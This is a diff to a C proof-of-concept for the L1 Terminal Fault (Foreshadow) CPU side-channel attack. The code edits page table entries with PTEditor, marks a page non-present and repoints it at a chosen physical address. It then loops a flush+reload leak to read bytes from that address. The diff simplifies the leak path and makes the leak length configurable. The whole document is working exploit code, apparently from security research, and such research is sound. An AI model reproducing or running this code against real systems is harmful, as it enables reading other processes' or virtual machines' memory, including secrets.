@@ -32,35 +32,11 @@ uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]) {
   return result;
 }
 
-void l1tf_full_mispredict(void *leak_addr, reload_buffer_t reload_buffer,
-                          bool *do_l1tf) {
-  volatile int dummy = 0;
-  for (int i = 0; i < 123; ++i) {
-    for (int j = 0; j < 67; ++j) {
-      dummy += i - j;
-    }
-  }
-
-  clflush(do_l1tf);
-  mfence();
-
-  if (*do_l1tf) {
-    dummy = *reload_buffer[1][0x1];
-    asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
-    dummy = *reload_buffer[0][0x2];
-  }
-}
-
-uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer,
-                  bool do_l1tf) {
+uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
   size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};
 
-  for (int i = 0; i < 20; ++i) {
-    l1tf_full_mispredict(leak_addr, reload_buffer, true);
-  }
-
   flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
-  l1tf_full_mispredict(leak_addr, reload_buffer, &do_l1tf);
+  asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
   reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
          THRESHOLD);
 
@@ -114,23 +90,22 @@ leak_addr_t l1tf_leak_buffer_create() {
 
   leak_addr_t leak;
   leak.leak = leak_ptr;
-  leak.original_pfn = ptedit_pte_get_pfn(leak.leak, 0);
-  leak.current_pfn = leak.original_pfn;
 
-  ptedit_pte_clear_bit(leak.leak, 0, PTEDIT_PAGE_BIT_PRESENT);
+  ptedit_entry_t entry = ptedit_resolve(leak.leak, 0);
+  leak.pte_ptr = entry.pte_ptr;
+  leak.original_pfn = ptedit_get_pfn(*leak.pte_ptr);
+
+  *leak.pte_ptr &= ~(1ull << PTEDIT_PAGE_BIT_PRESENT);
+  ptedit_invalidate_tlb(leak.leak);
+
   return leak;
 }
 
 void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr) {
   size_t pfn = (((uintptr_t)ptr) & ~(0xfff)) >> 0xc;
-
-  // This leak addr is already point to the corrent page frame
-  // number, so there is no need to modify the page table.
-  if (leak->current_pfn == pfn) {
-    return;
-  }
-  leak->current_pfn = pfn;
-  ptedit_pte_set_pfn(leak->leak, 0, pfn);
+  // ptedit_pte_set_pfn(leak->leak, 0, pfn);
+  size_t current_pte = *(leak->pte_ptr);
+  *(leak->pte_ptr) = ptedit_set_pfn(current_pte, pfn);
 }
 
 void l1tf_leak_buffer_free(leak_addr_t *leak) {
@@ -139,10 +114,16 @@ void l1tf_leak_buffer_free(leak_addr_t *leak) {
   assert(!munmap(leak->leak, PAGE_SIZE));
 }
 
-int main(int argc, char *argv[argc]) {
+void initialize_pteditor_lib() {
+  fprintf(stderr, "Initializing PTEdit...\r");
   assert(!ptedit_init());
-  l1tf_scan_physical_memory(1, "\xde", PAGE_SIZE);
-  exit(0);
+  fprintf(stderr,
+          "Initialized PTEdit! Mapping physical memory to user space...\n");
+  ptedit_use_implementation(PTEDIT_IMPL_USER);
+}
+
+int main(int argc, char *argv[argc]) {
+  initialize_pteditor_lib();
 
   // Step 1: Create a variable
   // Step 2: modify PTE to change make page containing that variable non-present
@@ -162,10 +143,8 @@ int main(int argc, char *argv[argc]) {
   assert(tail != argv[1]);
 
   tail = NULL;
-  size_t do_it = strtoull(argv[2], &tail, 10);
+  size_t length = strtoull(argv[2], &tail, 10);
   assert(tail != argv[2]);
-
-  size_t length = 32;
 
   fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length,
           (void *)phys_addr);
@@ -194,7 +173,7 @@ int main(int argc, char *argv[argc]) {
   while (1) {
     for (size_t j = start; j < start + length; j += 1) {
       void *leak_addr = (char *)leak.leak + j;
-      uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer, do_it);
+      uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);
 
       if (leaked_byte != 0) {
         results[j - start] = leaked_byte;
